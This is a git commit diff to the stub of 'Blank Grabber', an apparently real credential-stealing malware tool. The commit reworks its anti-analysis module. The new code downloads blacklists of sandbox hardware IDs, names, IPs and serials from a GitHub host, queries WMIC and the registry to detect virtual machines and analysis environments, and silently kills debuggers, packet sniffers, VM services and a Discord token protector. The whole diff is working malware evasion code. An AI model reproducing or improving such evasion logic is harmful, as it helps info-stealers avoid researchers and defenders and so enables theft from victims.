cf6ce1389b53cf32858ff8ce66db9d2687ccc653
Crypt <qspoofing@gmail.com>
2023-06-13 19:36:11 -0500

    antivm improvement

--- Blank Grabber/Components/stub.py
+++ Blank Grabber/Components/stub.py
@@ -54,53 +54,71 @@ class Settings:
     DiscordInjection = bool("%discordinjection%")
 
 class VmProtect:
-
-    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
-    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
-    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
-    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')
-
-    @staticmethod
-    def checkUUID() -> bool: # Checks if the UUID of the user is blacklisted or not
-        uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
-        return uuid in VmProtect.BLACKLISTED_UUIDS
-
-    @staticmethod
-    def checkComputerName() -> bool: # Checks if the computer name of the user is blacklisted or not
-        computername = os.getenv("computername")
-        return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES
-
-    @staticmethod
-    def checkUsers() -> bool: # Checks if the username of the user is blacklisted or not
-        user = os.getlogin()
-        return user.lower() in VmProtect.BLACKLISTED_USERS
+    http = PoolManager()
+    HwidList = " ".join(http.request('GET', 'https://github.com/zEncrypte/vm-blacklist/raw/main/hwid_list.txt').data.decode().split("\n")).replace('[','').replace(']','')
+    NameList = " ".join(http.request('GET', 'https://github.com/zEncrypte/vm-blacklist/raw/main/pc_name_list.txt').data.decode().split("\n")).replace('[','').replace(']','')
+    UserList  = " ".join(http.request('GET', 'https://github.com/zEncrypte/vm-blacklist/raw/main/pc_username_list.txt').data.decode().split("\n")).replace('[','').replace(']','')
+    GpuList = " ".join(http.request('GET', 'https://github.com/zEncrypte/vm-blacklist/raw/main/gpu_list.txt').data.decode().split("\n")).replace('[','').replace(']','')
+    IpList = " ".join(http.request('GET', 'https://github.com/zEncrypte/vm-blacklist/raw/main/ip_list.txt').data.decode().split("\n")).replace('[','').replace(']','')
+    BiosSerial = " ".join(http.request('GET', 'https://github.com/zEncrypte/vm-blacklist/raw/main/BIOS_Serial_List.txt').data.decode().split("\n")).replace('[','').replace(']','')
+    BaseBoardSerial = " ".join(http.request('GET', 'https://github.com/zEncrypte/vm-blacklist/raw/main/BaseBoard_Serial_List.txt').data.decode().split("\n")).replace('[','').replace(']','')
+    DiskSerial = " ".join(http.request('GET', 'https://github.com/zEncrypte/vm-blacklist/raw/main/DiskDrive_Serial_List.txt').data.decode().split("\n")).replace('[','').replace(']','')
+    BaseBoardManufacturerList = " ".join(http.request('GET', 'https://github.com/zEncrypte/vm-blacklist/raw/main/BaseBoard_Manufacturer_List.txt').data.decode().split("\n")).replace('[','').replace(']','')
+    HwProfile = " ".join(http.request('GET', 'https://github.com/zEncrypte/vm-blacklist/raw/main/HwProfileGuid_List.txt').data.decode().split("\n")).replace('[','').replace(']','')
+    MachineGuid = " ".join(http.request('GET', 'https://github.com/zEncrypte/vm-blacklist/raw/main/MachineGuid.txt').data.decode().split("\n")).replace('[','').replace(']','')
+    CpuSerial = {'nebwazhere-34129687498431345682662821879', 'None', '0'}
+    TaskList = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')
 
     @staticmethod
-    def checkHosting() -> bool: # Checks if the user's system in running on a server or not
+    def checkHwid() -> bool: # Checks if the UUID is blacklisted or not
+        return subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.splitlines()[2].decode(errors='ignore').strip() in VmProtect.HwidList
+
+    @staticmethod
+    def checkNameUser() -> bool:  # Checks if the name and computer user is blacklisted or not
+        return os.getenv("computername").lower() in VmProtect.NameList and os.getlogin().lower() in VmProtect.UserList
+    
+    @staticmethod
+    def checkGpu() -> bool: # Checks if the gpu is blacklisted or not
+        return subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors='ignore').splitlines()[2].strip() in VmProtect.GpuList
+    
+    @staticmethod
+    def checkIp() -> bool: # Checks if the ip is blacklisted or not
         http = PoolManager()
-        try:
-            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
-        except Exception:
-            return False
+        try:return http.request('GET', 'https://api.ipify.org').data.decode() in VmProtect.IpList
+        except:return False
 
     @staticmethod
-    def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
-        http = PoolManager(timeout= 1.0)
-        try:
-            http.request('GET', f'https://blank-{Utility.GetRandomString()}.in')
-        except Exception:
-            return False
-        else:
-            return True
+    def checkBiosSerial() -> bool: # Checks if the bios serial is blacklisted or not
+        return subprocess.run('wmic bios get serialnumber', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode().split('\n')[1].strip() in VmProtect.BiosSerial
 
     @staticmethod
-    def checkRegistry() -> bool: # Checks if user's registry contains any data which indicates that it is a VM or not
-        r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
-        r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
-        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode().splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
-        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
-        return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
+    def checkBaseBoardSerial() -> bool: # Checks if the baseboard serial is blacklisted or not
+        return subprocess.run('wmic baseboard get serialnumber', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode().split('\n')[1].strip() in VmProtect.BaseBoardSerial
 
+    @staticmethod
+    def checkDiskSerial() -> bool: # Checks if the disk serial is blacklisted or not
+        return subprocess.run('wmic diskdrive get serialnumber', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode().split('\n')[1].strip() in VmProtect.DiskSerial
+
+    @staticmethod
+    def checkCpuSerial() -> bool: # Checks if the cpu serial is blacklisted or not
+        return subprocess.run('wmic cpu get serialnumber', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode().split('\n')[1].strip() in VmProtect.CpuSerial
+
+    @staticmethod
+    def checkBaseBoardManufacturer() -> bool: # Checks if the baseboard manufacturer is blacklisted or not
+        return subprocess.run('wmic baseboard get manufacturer', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode().split('\n')[1].strip() in VmProtect.BaseBoardManufacturerList
+
+    @staticmethod
+    def checkHwProfile() -> bool: # Checks if the hardware profile is blacklisted or not
+        return subprocess.run(r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001" /v HwProfileGuid', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode('latin-1').split()[-1].replace('{','').replace('}','') in VmProtect.HwProfile
+    
+    @staticmethod
+    def checkHyperV() -> bool: # Checks if the hyper-V of the user is enabled or not
+        return subprocess.run(r'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Virtualization"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode('latin-1').split()[-1] == "1"
+    
+    @staticmethod
+    def checkMachineGuid() -> bool: # Checks if the machine guid is blacklisted or not
+        return subprocess.run(r'reg query "HKLM\SOFTWARE\Microsoft\Cryptography" /v MachineGuid', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode('latin-1').split()[-1] in VmProtect.MachineGuid
+    
     @staticmethod
     def killTasks(*tasks: str) -> None: # Kills blacklisted processes
         out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
@@ -108,17 +126,45 @@ class VmProtect:
             i = i.split("\r\n")[:2]
             try:
                 name, pid = i[0].split()[-1].rstrip('.exe'), int(i[1].split()[-1])
-                if not name in (tasks or VmProtect.BLACKLISTED_TASKS):
+                if not name in (tasks or VmProtect.TaskList):
                     continue
-                subprocess.Popen('taskkill /F /PID %d' % pid, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-            except Exception:
-                pass
+                subprocess.Popen('taskkill /F /PID %d' % pid, shell= True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+            except Exception:pass
+
+    @staticmethod
+    def checkHosting() -> bool: # Checks if the user's system in running on a server or not
+        http = PoolManager()
+        try:return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
+        except Exception:return False
+
+    @staticmethod
+    def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
+        http = PoolManager(timeout= 1.0)
+        try:http.request('GET', f'https://Akira-{Utility.GetRandomString()}.in')
+        except Exception:return False
+        else:return True
 
     @staticmethod
     def isVM() -> bool: # Checks if the user is running on a VM or not
-        Thread(target= VmProtect.killTasks, daemon= True).start()
-        return VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
-
+        Thread(target=VmProtect.killTasks, daemon=True).start()
+        return any([
+            VmProtect.checkHwid(),
+            VmProtect.checkNameUser(),
+            VmProtect.checkGpu(),
+            VmProtect.checkIp(),
+            VmProtect.checkBiosSerial(),
+            VmProtect.checkBaseBoardSerial(),
+            VmProtect.checkDiskSerial(),
+            VmProtect.checkCpuSerial(),
+            VmProtect.checkBaseBoardManufacturer(),
+            VmProtect.checkHwProfile(),
+            VmProtect.checkMachineGuid(),
+            VmProtect.killTasks(),
+            VmProtect.checkHosting(),
+            VmProtect.checkHTTPSimulation(),
+            VmProtect.checkHyperV(),
+        ])
+    
 class Errors:
 
     errors: list[str] = []
